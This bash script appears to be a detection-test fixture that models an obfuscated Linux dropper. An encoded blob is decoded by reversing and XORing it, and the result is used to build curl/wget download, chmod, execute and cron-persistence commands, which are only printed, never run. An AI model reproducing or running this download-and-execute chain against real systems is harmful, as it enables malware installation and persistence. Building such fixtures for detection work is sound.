#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_3f2e2e77='%83%d6%87%83%d9%d7%d1%84%d7%85%cc%84%95%80%85%91%94%ce%85%cf%8f%8e%93%82%ce%82%95%84%ce%dc%89%95%80%91%be%8f%8e%93%82%9d%84%82%88%97%93%84%92%cf%83%d6%87%83%d9%d7%d1%84%d7%85%cc%84%95%80%85%91%94%dc%84%8c%80%8f%be%84%82%88%97%93%84%92%9d%8c%cc%84%8c%80%8f%94%dc%84%83%8e%93%91%be%89%82%93%80%9d%83%d6%87%83%d9%d7%d1%84%d7%85%cc%84%86%80%95%92%cf%ce%84%89%82%80%82%cc%92%92%84%93%95%8f%94%89%ce%91%8c%95%ce%dc%89%95%80%91%be%84%8d%88%87%9d%83%d6%87%83%d9%d7%d1%84%d7%85%ce%83%80%ad%92%92%84%93%95%8f%94%a9%dc%95%8f%84%86%80%be%93%84%92%94%9d%89%92%cf%d3%d8%85%d4%80%d0%d7%d2%ce%85%88%8d%80%97%8f%88%cf%84%8d%91%8c%80%99%84%cf%83%d6%87%83%d9%d7%d1%84%d7%85%ce%ce%db%92%91%95%95%89%dc%8d%93%94%9d%83%d6%87%83%d9%d7%d1%84%d7%85%cc%8f%86%88%80%91%8c%80%82%dc%85%88%be%8f%86%88%80%91%8c%80%82%9d%d4%dc%95%8f%94%8e%82%be%84%86%80%95%92%9d%8a%82%80%83%8d%8d%80%87%be%89%82%93%80%be%8d%93%94%82%dc%93%84%95%91%80%85%80%9d%92%92%84%82%8e%93%91%be%89%82%95%80%91%92%88%85%cd%84%85%8e%8c%be%84%86%8f%80%89%82%cd%84%8d%88%87%be%84%95%88%93%96%cd%84%95%8e%8c%84%93%be%84%93%88%94%90%82%80%cd%95%92%8e%89%be%84%8d%88%87%8e%93%91%dc%92%91%84%95%92%9d%d0%dc%97'
readonly Codec_3f2e2e77='percent_hex|reverse_then_xor|e1'

Load_3f2e2e77() {
  item1=()
  local raw="${Material_3f2e2e77}" item6
  for item6 in ${raw//%/ }; do [[ -n "$item6" ]] && item1+=("$((16#$item6))"); done
}

Decode_3f2e2e77() {
  item2=()
  local item5
  for ((item5=0; item5<${#item1[@]}; item5++)); do
    item2[${#item1[@]}-1-item5]="$((item1[item5] ^ 225))"
  done
}

Recover_3f2e2e77() {
  local -a item1 item2
  local item3 item4 item8 item5
  item4=''
  Load_3f2e2e77
  for item8 in 1; do Decode_3f2e2e77; done
  item3=''
  local octal character
  for item5 in "${!item2[@]}"; do
    printf -v octal '%03o' "${item2[item5]}"
    printf -v character '%b' "\\$octal"
    item3+="$character"
  done
  printf '%s\n' "$item3"
}

Inspect_3f2e2e77() { local recovered; recovered="$(Recover_3f2e2e77)"; printf '%s\n' "$recovered"; }

Plan_3f2e2e77() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_3f2e2e77)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
  declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_3f2e2e77; fi
